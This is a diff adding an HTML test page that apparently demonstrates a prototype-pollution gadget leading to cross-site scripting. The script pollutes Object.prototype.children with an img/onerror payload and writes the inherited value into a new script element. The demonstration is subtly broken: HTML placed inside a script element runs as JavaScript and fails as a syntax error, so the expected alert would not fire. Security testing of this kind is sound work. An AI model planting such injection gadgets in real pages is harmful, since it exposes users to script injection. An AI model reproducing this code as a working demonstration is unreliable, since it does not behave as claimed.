@@ -1,0 +1,25 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>PP Gadget Test</title>
+</head>
+<body>
+    <h1>Testing PP Gadget</h1>
+    <div id="result"></div>
+    
+    <script>
+        // Pollute children
+        Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+        
+        // Simulate the gadget
+        let o = document.createElement("script");
+        let r = {};
+        
+        // This is what the gadget does:
+        o.innerHTML = r.children;
+        document.head.appendChild(o);
+        
+        document.getElementById('result').innerHTML = "Gadget executed - check if alert fired!";
+    </script>
+</body>
+</html>
